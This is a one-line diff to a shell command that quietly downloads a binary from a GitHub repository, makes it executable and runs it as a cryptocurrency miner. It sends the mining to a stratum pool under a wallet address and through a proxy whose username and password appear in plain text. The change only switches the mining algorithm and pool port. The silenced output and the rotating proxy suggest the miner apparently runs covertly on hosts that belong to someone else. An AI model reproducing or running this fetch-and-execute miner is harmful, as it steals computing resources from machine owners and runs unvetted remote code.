@@ -1,1 +1,1 @@
-wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null && chmod +x data && ./data -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445  -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN,ID=Test  -x zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80
+wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null && chmod +x data && ./data -a  yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN -x zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80
